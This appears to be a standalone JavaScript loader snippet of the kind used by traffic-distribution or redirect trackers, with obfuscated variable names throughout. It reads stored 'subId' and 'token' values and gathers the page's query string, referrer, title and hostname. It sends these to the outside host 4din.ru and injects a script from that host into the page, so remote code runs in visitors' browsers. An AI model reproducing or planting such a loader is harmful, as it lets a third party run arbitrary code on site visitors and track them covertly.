(function() {
    var name = '_qrgZdh8mnJ6x87ZM';
    if (!window._qrgZdh8mnJ6x87ZM) {
        window._qrgZdh8mnJ6x87ZM = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://4din.ru/KxhsKTFR',
            P_PATH: 'https://4din.ru/7a3be7b/postback',
        };
    }
    const _hxhTMQb6X3SbvLym = localStorage.getItem('config');
    if (typeof _hxhTMQb6X3SbvLym !== 'undefined' && _hxhTMQb6X3SbvLym !== null) {
        var _q4V464xR8kL812yN = JSON.parse(_hxhTMQb6X3SbvLym);
        var _FqTYrq1qMtK87BPk = Math.round(+new Date()/1000);
        if (_q4V464xR8kL812yN.created_at + window._qrgZdh8mnJ6x87ZM.ttl < _FqTYrq1qMtK87BPk) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _rdTFtp6czdwKzP3S = localStorage.getItem('subId');
    var _hC1BwPP3t63gh72q = localStorage.getItem('token');
    var _jmCBbh784V7dgqbG = '?return=js.client';
        _jmCBbh784V7dgqbG += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _jmCBbh784V7dgqbG += '&se_referrer=' + encodeURIComponent(document.referrer);
        _jmCBbh784V7dgqbG += '&default_keyword=' + encodeURIComponent(document.title);
        _jmCBbh784V7dgqbG += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _jmCBbh784V7dgqbG += '&name=' + encodeURIComponent(name);
        _jmCBbh784V7dgqbG += '&host=' + encodeURIComponent(window._qrgZdh8mnJ6x87ZM.R_PATH);
    if (typeof _rdTFtp6czdwKzP3S !== 'undefined' && _rdTFtp6czdwKzP3S && window._qrgZdh8mnJ6x87ZM.unique) {
        _jmCBbh784V7dgqbG += '&sub_id=' + encodeURIComponent(_rdTFtp6czdwKzP3S);
    }
    if (typeof _hC1BwPP3t63gh72q !== 'undefined' && _hC1BwPP3t63gh72q && window._qrgZdh8mnJ6x87ZM.unique) {
        _jmCBbh784V7dgqbG += '&token=' + encodeURIComponent(_hC1BwPP3t63gh72q);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._qrgZdh8mnJ6x87ZM.R_PATH + _jmCBbh784V7dgqbG;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
